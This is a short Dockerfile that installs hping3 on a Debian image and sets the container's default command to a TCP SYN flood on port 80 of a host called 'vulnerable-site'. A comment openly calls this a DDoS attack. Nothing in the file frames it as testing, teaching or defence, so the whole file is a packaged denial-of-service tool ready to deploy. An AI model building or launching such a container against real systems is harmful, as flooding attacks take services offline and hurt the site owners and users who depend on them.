# Use a lightweight Linux image
FROM debian:latest

# Update the package repository and install hping3
RUN apt-get update && apt-get install -y hping3

# Set the default command to use hping3 for the DDoS attack
CMD ["hping3", "-S", "--flood", "-V", "-p", "80", "vulnerable-site"]
